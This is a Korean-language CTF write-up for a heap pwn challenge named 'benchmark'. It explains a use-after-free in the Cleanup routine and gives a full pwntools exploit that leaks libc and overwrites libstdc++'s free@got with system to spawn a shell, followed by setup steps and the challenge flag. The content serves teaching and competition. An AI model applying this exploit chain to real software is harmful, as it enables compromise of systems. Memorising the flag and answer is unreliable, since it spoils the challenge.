# 출제자

조정훈

# 풀이

Run / Re-run / Revise / Cleanup / Status 기능이 존재하는 menu challenge 이다.

```c
typedef struct _benchmark {
    thread t;
    int joined; 
    int rc;
    int parent;
    milliseconds elapsed;
    int arg_len;
    char *arg;
} benchmark;
```

Run : 유저에게 string을 입력받아 thread를 생성해 benchmark 진행, benchmark 객체는 전역변수 g_benchmark에서 관리된다.
Re-Run : 존재하는 Joined 상태의 benchmark를 parent로 선택해 새로운 benchmark를 생성한다. parent의 reference counter를 증가시키고 arg를 shallow copy한다.
Revise : arg를 arg_len 만큼 수정한다.
Cleanup : Joined 상태의 benchmark를 선택해 t를 join시키고 delete한다. parent 값이 유효할 경우 (Re-Run에 의해 생성되어) arg는 delete 하지 않는다.
Status : 각 benchmark의 status를 출력한다.

취약점은 Cleanup 함수에 존재한다. benchmark를 delete할 때 reference counter가 0인지 체크하지 않기에 child benchmark의 arg가 dangling pointer가 될 수 있다.

Exploit은 아래와 같다.

1. Benchmark 0 생성, Re-run으로 child benchmark 생성
2. Cleanup(0) -> Benchmark_1->arg는 dangling pointer가 된다.
3. Benchmark 2를 생성하며 0x30 크기의 arg 할당, 해당 arg는 Benchmark_0의 해제된 arg 위에 할당된다.
4. Status를 통해 Benchmark 2의 thread pointer를 읽어 libc leak
5. Revise를 통해 Benchmark 2의 arg를 조작해 AAW
6. libstdcpp의 free@got를 system으로 덮어 shell 획득

```python
from pwn import *

#p = process('./benchmark')
p = remote('localhost', 30030)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'abcd')

sleep(0.1)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'abcd')

sleep(0.1)

p.sendlineafter(b'> ', b'5')
p.recvuntil(b'arg: ')
p.recvuntil(b'arg: ')
leak = u64(p.recv(6)+b'\x00\x00') 
libc = leak + 0xeb9c0
libcpp = libc + 0x249000
print(hex(libc), hex(libcpp))

pay = p64(leak) + p64(1)
pay += p64(0xffffffff) + p64(0xa)
pay += p64(0x30) + p64(libcpp+0x226c38)
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'1')
p.sendafter(b': ', pay)

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'0')
p.sendafter(b': ', p64(libc+0x50d70))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'/bin/sh')

sleep(0.1)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'2')
p.recv()

p.interactive()
```

# 문제 세팅 방법

`docker-compose up -d`

# 출제 지문

Test your pc real quick :-)

# 플래그

`hspace{e604b31c05e0ed5ab9dac59a613eb309}`